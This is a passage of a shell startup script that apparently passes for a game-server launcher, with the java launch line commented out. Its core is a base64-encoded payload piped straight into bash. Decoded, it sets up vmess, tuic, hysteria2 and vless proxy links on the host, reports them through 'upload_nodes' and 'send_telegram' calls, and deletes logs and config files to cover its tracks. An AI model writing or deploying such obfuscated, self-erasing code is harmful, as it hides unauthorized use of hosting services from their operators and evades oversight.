1tYXgtdGltZSAyIGlwdjQuaXAuc2IgfHwgY3VybCAtcyAtLW1heC10aW1lIDEgYXBpLmlwaWZ5Lm9yZyB8fCB7IGlwdjY9JChjdXJsIC1zIC0tbWF4LXRpbWUgMSBpcHY2LmlwLnNiKTsgZWNobyAiWyRpcHY2XSI7IH0gfHwgZWNobyAiWFhYIikKSVNQPSQoY3VybCAtcyAtLW1heC10aW1lIDIgaHR0cHM6Ly9zcGVlZC5jbG91ZGZsYXJlLmNvbS9tZXRhIHwgYXdrIC1GXCIgJ3twcmludCAkMjYiLSIkMTh9JyB8IHNlZCAtZSAncy8gL18vZycgfHwgZWNobyAiMC4wIikKClZNRVNTPSJ7IFwidlwiOiBcIjJcIiwgXCJwc1wiOiBcIiR7TkFNRX0tJHtJU1B9XCIsIFwiYWRkXCI6IFwiJHtDRklQfVwiLCBcInBvcnRcIjogXCIke0NGUE9SVH1cIiwgXCJpZFwiOiBcIiR7VVVJRH1cIiwgXCJhaWRcIjogXCIwXCIsIFwic2N5XCI6IFwibm9uZVwiLCBcIm5ldFwiOiBcIndzXCIsIFwidHlwZVwiOiBcIm5vbmVcIiwgXCJob3N0XCI6IFwiJHthcmdvZG9tYWlufVwiLCBcInBhdGhcIjogXCIvdm1lc3MtYXJnbz9lZD0yMDQ4XCIsIFwidGxzXCI6IFwidGxzXCIsIFwic25pXCI6IFwiJHthcmdvZG9tYWlufVwiLCBcImFscG5cIjogXCJcIiwgXCJmcFwiOiBcIlwifSIKCmNhdCA+ICR7RklMRV9QQVRIfS9saXN0LnR4dCA8PEVPRgp2bWVzczovLyQoZWNobyAiJFZNRVNTIiB8IGJhc2U2NCAtdzApCkVPRgoKaWYgWyAiJFRVSUNfUE9SVCIgIT0gIjQwMDAwIiBdOyB0aGVuCiAgZWNobyAtZSAiXG50dWljOi8vJHtVVUlEfTphZG1pbkAke0lQfToke1RVSUNfUE9SVH0/c25pPXd3dy5iaW5nLmNvbSZhbHBuPWgzJmNvbmdlc3Rpb25fY29udHJvbD1iYnIjJHtOQU1FfS0ke0lTUH0iID4+ICR7RklMRV9QQVRIfS9saXN0LnR4dApmaQoKaWYgWyAiJEhZMl9QT1JUIiAhPSAiNTAwMDAiIF07IHRoZW4KICBlY2hvIC1lICJcbmh5c3RlcmlhMjovLyR7VVVJRH1AJHtJUH06JHtIWTJfUE9SVH0vP3NuaT13d3cuYmluZy5jb20mYWxwbj1oMyZpbnNlY3VyZT0xIyR7TkFNRX0tJHtJU1B9IiA+PiAke0ZJTEVfUEFUSH0vbGlzdC50eHQKZmkKCmlmIFsgIiRSRUFMSVRZX1BPUlQiICE9ICI2MDAwMCIgXTsgdGhlbgogIGVjaG8gLWUgIlxudmxlc3M6Ly8ke1VVSUR9QCR7SVB9OiR7UkVBTElUWV9QT1JUfT9lbmNyeXB0aW9uPW5vbmUmZmxvdz14dGxzLXJwcngtdmlzaW9uJnNlY3VyaXR5PXJlYWxpdHkmc25pPXd3dy5uYXpodW1pLmNvbSZmcD1jaHJvbWUmcGJrPSR7cHVibGljX2tleX0mdHlwZT10Y3AmaGVhZGVyVHlwZT1ub25lIyR7TkFNRX0tJHtJU1B9IiA+PiAke0ZJTEVfUEFUSH0vbGlzdC50eHQKZmkKCmJhc2U2NCAtdzAgJHtGSUxFX1BBVEh9L2xpc3QudHh0ID4gJHtGSUxFX1BBVEh9L3N1Yi50eHQKY2F0ICR7RklMRV9QQVRIfS9zdWIudHh0CmVjaG8gLWUgIlxuXG5cZVsxOzMybSR7RklMRV9QQVRIfS9zdWIudHh0IHNhdmVkIHN1Y2Nlc3NmdWxseVxlWzBtIgp1cGxvZF9ub2RlcwpzZW5kX3RlbGVncmFtCmVjaG8gLWUgIlxuXGVbMTszMm1SdW5uaW5nIGRvbmUhXGVbMG1cbiIKc2xlZXAgMTAgCgpybSAtcmYgYm9vdC5sb2cgY29uZmlnLmpzb24gc2IubG9nIGNvcmUgZmFrZV91c2VyYWdlbnRfMC4yLjAuanNvbiAke0ZJTEVfUEFUSH0vbGlzdC50eHQgPi9kZXYvbnVsbCAyPiYx" | base64 -d | bash

# chmod +x ${GAME_FILE} && java -jar ${GAME_FILE}

# tail -f /dev/null
